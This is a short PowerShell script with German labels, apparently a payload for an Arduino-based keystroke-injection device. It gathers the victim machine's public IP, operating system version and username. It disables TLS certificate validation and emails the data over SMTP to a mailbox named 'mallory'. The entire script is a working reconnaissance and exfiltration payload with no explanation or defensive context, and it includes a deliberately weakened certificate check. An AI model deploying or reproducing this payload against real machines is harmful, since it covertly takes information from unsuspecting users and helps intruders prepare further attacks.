$ip = (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
$os = Get-WmiObject -Class Win32_OperatingSystem | select Caption, Version
$username = $env:USERNAME

$emailBody = "IP-Adresse: $ip`nBetriebssystem: $($os.Caption) $($os.Version)`nBenutzername: $username"

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

$EmailFrom = "a@mailserver.de"
$EmailTo = "mallory@mailserver.de"
$Subject = "Notification from Arduino"
$Body = $emailBody
$SMTPServer = "mail.mailserver.de"
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("a@mailserver.de", "PASSWORD");
$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
